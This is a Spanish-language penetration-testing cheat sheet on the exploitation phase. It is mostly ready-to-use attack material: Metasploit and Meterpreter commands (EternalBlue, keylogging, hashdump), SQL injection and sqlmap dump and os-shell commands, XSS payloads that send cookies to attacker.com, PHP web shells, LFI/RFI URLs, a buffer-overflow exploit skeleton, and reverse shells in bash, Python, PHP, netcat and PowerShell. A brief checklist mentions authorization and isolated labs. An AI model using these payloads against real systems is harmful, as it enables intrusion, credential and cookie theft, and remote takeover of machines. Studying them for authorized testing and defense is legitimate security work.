# Explotación

## ¿Qué es la explotación?

La explotación es la fase donde aprovechamos las vulnerabilidades identificadas para obtener acceso no autorizado al sistema objetivo.

## Tipos de Exploits

### Local Exploits
Requieren acceso previo al sistema.
- Escalada de privilegios
- Bypass de restricciones

### Remote Exploits
No requieren acceso previo.
- Buffer overflow
- SQL Injection
- Remote Code Execution (RCE)

## Metasploit Framework

### Comandos básicos
```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search <nombre>
search type:exploit platform:windows

# Seleccionar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones
show options
show payloads

# Configurar opciones
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# Seleccionar payload
set payload windows/x64/meterpreter/reverse_tcp

# Ejecutar exploit
exploit
run

# Comandos útiles
back          # Volver atrás
info          # Información del módulo
check         # Verificar si el objetivo es vulnerable
```

### Meterpreter
```bash
# Una vez obtenida sesión Meterpreter

# Información del sistema
sysinfo
getuid
ps

# Navegación
pwd
cd C:\\Windows
ls
cat archivo.txt

# Descargar/subir archivos
download C:\\archivo.txt /root/
upload /root/tool.exe C:\\Windows\\Temp\\

# Captura de pantalla
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Migrar proceso
migrate <PID>

# Shell del sistema
shell

# Privilege escalation
getsystem

# Hashdump
hashdump

# Pivoting
portfwd add -l 3389 -p 3389 -r 192.168.2.10
```

## Web Exploitation

### SQL Injection

#### Detección
```sql
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
') OR ('1'='1
```

#### Union-based
```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--
```

#### Error-based
```sql
' AND 1=CONVERT(int, @@version)--
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
```

#### Boolean-based Blind
```sql
' AND 1=1--  # True
' AND 1=2--  # False
' AND (SELECT LENGTH(database()))>5--
```

#### Time-based Blind
```sql
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
'; WAITFOR DELAY '00:00:05'--
```

### SQLMap
```bash
# Detección básica
sqlmap -u "http://ejemplo.com/page?id=1"

# Especificar parámetro
sqlmap -u "http://ejemplo.com/page" --data "id=1&user=test"

# Obtener bases de datos
sqlmap -u "http://ejemplo.com/page?id=1" --dbs

# Tablas de una BD
sqlmap -u "http://ejemplo.com/page?id=1" -D database_name --tables

# Columnas de una tabla
sqlmap -u "http://ejemplo.com/page?id=1" -D database_name -T users --columns

# Dump de datos
sqlmap -u "http://ejemplo.com/page?id=1" -D database_name -T users --dump

# OS Shell
sqlmap -u "http://ejemplo.com/page?id=1" --os-shell

# Usando cookies
sqlmap -u "http://ejemplo.com/page?id=1" --cookie="PHPSESSID=abc123"

# Desde archivo de Burp
sqlmap -r request.txt
```

### XSS (Cross-Site Scripting)

#### Payloads básicos
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

#### Robo de cookies
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>

<script>
new Image().src='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```

#### Bypass de filtros
```html
<SCRipT>alert('XSS')</sCRiPt>
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
<svg/onload=alert('XSS')>
```

### Command Injection

#### Operadores
```bash
# Unix/Linux
; ls
| ls
|| ls
& ls
&& ls
` ls `
$( ls )

# Windows
| dir
& dir
&& dir
```

#### Payloads
```bash
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | ls -la
```

### File Upload Vulnerabilities

#### Bypass de extensiones
```
# Doble extensión
shell.php.jpg

# Null byte (versiones antiguas)
shell.php%00.jpg

# Mayúsculas
shell.PHP
shell.PhP

# Extensiones alternativas
.php3 .php4 .php5 .phtml .phar
.asp .aspx .ascx
.jsp .jspx
```

#### Web shells básicos
```php
<!-- PHP -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>

<!-- PHP simple -->
<?= `$_GET[0]` ?>
```

### Local File Inclusion (LFI)

```bash
# Básico
http://ejemplo.com/page.php?file=../../../etc/passwd

# Con Null byte (versiones antiguas)
http://ejemplo.com/page.php?file=../../../etc/passwd%00

# PHP wrappers
http://ejemplo.com/page.php?file=php://filter/convert.base64-encode/resource=config.php
http://ejemplo.com/page.php?file=php://input
POST: <?php system('whoami'); ?>

# Log poisoning
http://ejemplo.com/page.php?file=../../../var/log/apache2/access.log
```

### Remote File Inclusion (RFI)

```bash
http://ejemplo.com/page.php?file=http://attacker.com/shell.txt
http://ejemplo.com/page.php?file=http://attacker.com/shell.txt%00
```

## Buffer Overflow

### Estructura básica
```python
#!/usr/bin/python3
import socket

# 1. Fuzzing - Encontrar el punto de crash
buffer = "A" * 2000

# 2. Offset - Encontrar la posición exacta del EIP
# Usar pattern_create.rb y pattern_offset.rb

# 3. Overwrite EIP
offset = 524
eip = "B" * 4
buffer = "A" * offset + eip

# 4. Buscar badchars
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  # ... etc
)

# 5. Encontrar JMP ESP
# Usar mona.py: !mona jmp -r esp -cpb "\x00\x0a"

# 6. Generar shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f py -b '\x00\x0a'

# 7. Exploit final
nop_sled = "\x90" * 16
shellcode = b"\xda\xc1..."  # Tu shellcode
jmp_esp = "\x83\x0c\x09\x10"  # Dirección en little endian

exploit = "A" * offset + jmp_esp + nop_sled + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 9999))
s.send(exploit + b"\r\n")
s.close()
```

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Listeners

```bash
# Netcat
nc -nvlp 4444

# Metasploit
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <tu-ip>
set LPORT 4444
exploit
```

## Checklist de Explotación

- [ ] Verificar que tienes autorización
- [ ] Asegurar que el entorno de prueba está aislado
- [ ] Documentar cada intento de explotación
- [ ] Verificar vulnerabilidades con herramientas automáticas
- [ ] Realizar pruebas manuales de concepto
- [ ] Preparar listeners antes de ejecutar payloads
- [ ] Tener múltiples payloads de respaldo
- [ ] Verificar y evitar badchars en exploits
- [ ] Documentar evidencias del acceso obtenido

## Notas Importantes

> [!WARNING]
> **CUIDADO CON:**
> - Exploits que pueden crashear servicios
> - Modificación de archivos críticos del sistema
> - Exploits que pueden causar daños permanentes
> 
> Siempre ten un plan de rollback.

> [!TIP]
> Antes de ejecutar un exploit desconocido:
> 1. Lee el código fuente
> 2. Entiende qué hace
> 3. Pruébalo en un entorno controlado primero
> 4. Ten backups del sistema objetivo

## Herramientas Útiles

- **Metasploit**: Framework de explotación
- **SQLMap**: Automatización de SQL Injection
- **Burp Suite**: Proxy para testing web
- **ExploitDB**: Base de datos de exploits
- **SearchSploit**: Búsqueda local de exploits
- **MSFVenom**: Generador de payloads

## Referencias

- [Exploit Database](https://www.exploit-db.com/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PentestMonkey Reverse Shell Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
